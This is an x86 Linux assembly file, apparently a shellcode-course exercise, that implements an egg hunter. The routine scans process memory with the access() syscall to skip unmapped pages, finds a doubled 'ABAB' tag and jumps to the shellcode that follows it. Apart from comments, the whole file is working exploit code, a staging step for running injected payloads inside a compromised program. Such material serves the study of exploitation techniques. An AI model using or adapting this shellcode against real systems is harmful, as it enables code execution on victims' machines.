;Author : Dibyendu Sikdar
;https://github.com/dibsy/SLAEx86/
;PA-1191
;http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf


global _start

section .text


_start:
	xor eax,eax		;clear eax
	xor ebx,ebx		;clear ebx
	xor ecx,ecx		;clear ecx
	xor edx,edx		;clear edx

	mov ebx,0x41424142	;TAG=ABAB
	
;;;;;;;;;;;;;;;;;;;;;;;;	Page Alignment 		;;;;;;;;;;;;;;;;;;;;;;;

_efault:
	or dx,0xfff		;0xfff in 1st run, 0x1fff in 2nd run, 0x2fff in 3rd run, etc

;;;;;;;;;;;;;;;;;;;;;;;;	Generate Address	;;;;;;;;;;;;;;;;;;;;;;;

_valid:
	inc edx			;0x1000,0x2000 in 1st run

;;;;;;;;;;;;;;;;;;;;;;;		Search operation	;;;;;;;;;;;;;;;;;;;;;;;

_search:
	;;;;;;;;	Check if memory can be accessed at location generated by edx	;;;;;;;;	
	
	pusha			;pushes all general purpose registers to stack
	lea ebx,[edx]		;ebx becomes 1000 in 1st run
	mov al,0x21		;mov value 33 ( 0x21 ) to al , #define __NR_access 33
	int 0x80		;interrupt for access() syscall

	cmp al,0xf2		;if returned value is fault occours is 0xf2
	popa			;restores back all register values from stack to individual registers

	jz _efault		;EFAULT happended due to accessing address outside accessible address, so go back to _efault:
	
	;;;;;;;;	No address fault! Lets check if we have our tag in that area 	;;;;;;;;
	
	cmp [edx],ebx		;compare TAG in ebx to the memory pointed by edx
	jnz _valid		;if its not found, jump to _valid: to increment the EDX pointer to point to next memory location
	cmp[edx+0x4],ebx	;Coming to this step means we already found 1 occurence of TAG and let us search for the 2nd occourence at the immediate next location
	jnz _valid		;If the next location is not as same then jump to _valid: to increment the EDX pointer to point to next memory location
	jmp edx			;AWESOME ! We found both the 2nd TAG location.Lets jump to the location wher 2nd occourence was found and just immediate to that our shellcode is waiting for us <3  


	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
